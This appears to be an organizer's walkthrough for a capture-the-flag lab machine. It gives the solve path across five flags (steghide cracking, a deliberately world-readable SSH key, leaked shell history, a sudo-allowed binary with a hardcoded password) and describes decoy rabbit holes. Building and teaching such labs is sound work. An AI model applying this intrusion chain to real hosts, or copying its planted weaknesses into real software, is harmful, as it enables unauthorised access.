# Organizer Solutions

Full solve walkthrough, organizer-only. Never share this file or its
contents with players.

Flags are generated randomly on every install (`CTF{<32 hex chars>}`,
base64-encoded wherever they're stored). To see the actual current values
for a live install:

```bash
sudo cat /opt/ctf/.organizer/secrets.env
```

or validate them in place without printing plaintext into your terminal
history:

```bash
sudo bash scripts/check_flags.sh
```

Everything below uses the fixed values from `scripts/config.sh` (paths,
usernames, port, hidden directory names) — those don't change between
installs, only the flags/passwords do.

---

## FLAG 1 — Website / robots.txt

- **Discovery**: `GET /robots.txt` on the website lists a disallowed path.
- **Commands**:
  ```bash
  curl http://<IP>/robots.txt
  curl http://<IP>/hidden/classified-briefing-7f3a2b/
  ```
- **Expected output**: `robots.txt` shows `Disallow: /hidden/classified-briefing-7f3a2b/`. The page at that path is a plausible internal "briefing archive" — the flag sits at the very bottom, after enough legitimate-looking content that the player has to scroll, as `Ref: <base64>`.
- **Encoding**: Base64.
- **Decoding**: `echo '<base64>' | base64 -d`
- **Flag**: see `FLAG1` in `secrets.env`.

## FLAG 2 — Agent99

- **Discovery**: The steghide passphrase (real entry in your `rockyou.txt`,
  configured as `STEGHIDE_PASSPHRASE` in `scripts/config.sh`) must be
  brute-forced against the homepage image, `assets/team-photo.jpg`.
- **Commands**:
  ```bash
  curl -O http://<IP>/assets/team-photo.jpg
  steghide extract -sf team-photo.jpg   # prompts for passphrase, no -xf given
  cat Agent99.txt
  echo '<base64 from Agent99.txt>' | base64 -d
  ssh -p 2222 Agent99@<IP>
  ls -la ~
  cat ~/.net-cache.idx
  ```
- **Expected output**: extracting without `-xf` restores steghide's
  original embedded filename, `Agent99.txt` — this is deliberate: the
  filename itself is how the player learns the SSH username, since the
  file's content never names `Agent99` in plaintext, only holding a
  base64-encoded password. Once logged in, `ls -la` in the home directory
  shows `README.txt` and `.net-cache.idx` — the latter has an
  `entry_hash=<base64>` line.
- **Encoding**: Base64 (both the SSH password and the flag).
- **Decoding**: `echo '<base64>' | base64 -d`
- **Flag**: see `FLAG2` in `secrets.env`.

### Hidden directory clue (bridges Flag 2 → Flag 3)

- **Discovery**: `ls -la ~` alone won't show it if the player doesn't look
  closely; `find ~ -maxdepth 1` or plain `ls -la` reveals `.cache-index/`.
  ```bash
  cat ~/.cache-index/clue.dat | base64 -d
  ```
- **Content** (base64-encoded, not a flag): points the player at "what the
  system backs up" — i.e., towards `/var/backups/`.

## FLAG 3 — Backup

- **Discovery**: Following the hidden-directory clue toward backups:
  ```bash
  find /var/backups -maxdepth 1 -type d
  ```
  This surfaces **two** candidates: `/var/backups/legacy-ops/` (real) and
  `/var/backups/website-backup-2021/` (rabbit hole #1 — see below). The
  real one is world-readable.
  ```bash
  cat /var/backups/legacy-ops/ops-notes.txt
  ```
- **Expected output**: A migration log plus an "Archive checksum" line
  containing the base64 flag, and a note pointing at `keys/` for the
  Agent999 credential.
- **Encoding**: Base64.
- **Decoding**: `echo '<base64>' | base64 -d`
- **Flag**: see `FLAG3` in `secrets.env`.

### id_rsa (bridges Flag 3 → Agent999)

- **Discovery**:
  ```bash
  ls -la /var/backups/legacy-ops/keys/
  ```
  A file named `legacy_agent999_access` (not called `id_rsa`, but is one) —
  world-readable, which is the intended lax-permissions vulnerability.
- **Commands**:
  ```bash
  scp -P 2222 Agent99@<IP>:/var/backups/legacy-ops/keys/legacy_agent999_access .
  chmod 600 legacy_agent999_access   # ssh refuses group/world-readable keys
  ssh -p 2222 -i legacy_agent999_access Agent999@<IP>
  ```

## FLAG 4 — Agent999 .bash_history

- **Discovery**:
  ```bash
  cat ~/.bash_history
  ```
- **Expected output**: A realistic sequence of commands (checking the
  backup, `sudo -l`, disk usage, etc.) followed by:
  ```bash
  export LEGACY_TOKEN='<base64>'
  echo $LEGACY_TOKEN | base64 -d
  unset LEGACY_TOKEN
  history -c
  exit
  ```
  Note the file still shows all of this despite the `history -c` — that
  command only clears the *in-memory* history for the session that ran it;
  it never rewrote the file on disk. That inconsistency is the intended
  "why is this still here" moment for this stage.
- **Encoding**: Base64.
- **Decoding**: `echo '<base64>' | base64 -d`
- **Flag**: see `FLAG4` in `secrets.env`.

## FLAG 5 — Root

- **Discovery**: `sudo -l` as `Agent999`:
  ```bash
  sudo -l
  ```
  Output shows exactly one allowed command:
  ```text
  (root) NOPASSWD: /home/Agent999/.system-audit/.beroot ""
  ```
  This is also how the hidden `.system-audit/` directory is discovered —
  it was never listed by a normal `ls` in the home directory.
- **Transfer for analysis** (the intended technique is a Python HTTP
  server, never stated outright to players). Port `1337` is the only
  transfer port `ufw` allows inbound - see
  [NETWORK_GUIDE.md](NETWORK_GUIDE.md):
  ```bash
  # on the target, as Agent999:
  cd ~/.system-audit && python3 -m http.server 1337
  # on the attacker box:
  curl -O http://<IP>:1337/.beroot
  ```
- **Reverse engineering**: Open `.beroot` in Ghidra, decompile `main`. It's
  a single `strcmp()` against a hardcoded string — recoverable via Ghidra's
  decompiler or just `strings .beroot | less`.
- **Root transition**:
  ```bash
  sudo /home/Agent999/.system-audit/.beroot
  Password: <recovered password>
  whoami   # root
  cat /root/.sysconfig_cache
  echo '<base64>' | base64 -d
  ```
- **Why the sudo rule can't be abused for more than this**: the rule names
  the exact absolute path to `.beroot` and pins its argument list to `""`
  (no arguments). sudoers gives free rein over arguments when a command is
  listed without any — the explicit empty-argument spec is what prevents
  `sudo /home/Agent999/.system-audit/.beroot -c "some other command"` or
  similar from ever reaching sudo's parser as a valid invocation.
- **Encoding**: Base64.
- **Decoding**: `echo '<base64>' | base64 -d`
- **Flag**: see `FLAG5` in `secrets.env`.

---

## Rabbit holes (do not reveal to players)

### Rabbit hole 1 — Decoy backup directory

`/var/backups/website-backup-2021/` — an old static export of the marketing
site (`index.html.bak`, `old_notes.txt`) with genuinely irrelevant content.
Deliberately sits alongside the real `/var/backups/legacy-ops/` so that a
plain `find /var/backups -type d` surfaces both and the player has to
actually read the contents to tell them apart. No flag, no credentials, no
path forward.

### Rabbit hole 2 — Fake admin login

`http://<IP>/admin/` — a static "Staff Portal" login form. It is listed in
`robots.txt` alongside the real hidden path specifically so it reads as
equally interesting. The form has no backend at all; every submission is
rejected client-side by a few lines of JavaScript. There is no injection,
no bypass, and nothing to find in the page source beyond that.

### Rabbit hole 3 — Decoy SUID binary

`/usr/local/bin/sysdiag` — genuinely installed SUID-root (`chmod 4755`), so
`find / -perm -4000 2>/dev/null` will flag it as interesting. It only calls
`uname()` and `statvfs()` and prints fixed diagnostic text; it never shells
out, never trusts an environment variable or relative path, and takes no
input at all. There is no GTFOBins-style technique that turns this into a
shell — it is a dead end by design.

---

## Anti-shortcut checklist

Confirm all of these after every install (`tests/test_permissions.sh`
automates most of it):

- `sudo -l` as `Agent99` shows no usable rule (in fact, no sudo entry at
  all for that user).
- `Agent99` cannot read `/home/Agent999` or `/root`.
- `Agent999`'s only sudo rule is the exact `.beroot` path with no
  arguments — never `ALL`.
- The `.beroot` password appears nowhere under `/home/Agent999` in
  plaintext (not in history, not in a stray file).
- `grep -RIsE "CTF\{[0-9a-f]{32}\}" /` (excluding `/proc`, `/sys`, and
  `/opt/ctf/.organizer`) turns up nothing — every on-disk flag
  representation is base64, never the raw `CTF{...}` string.
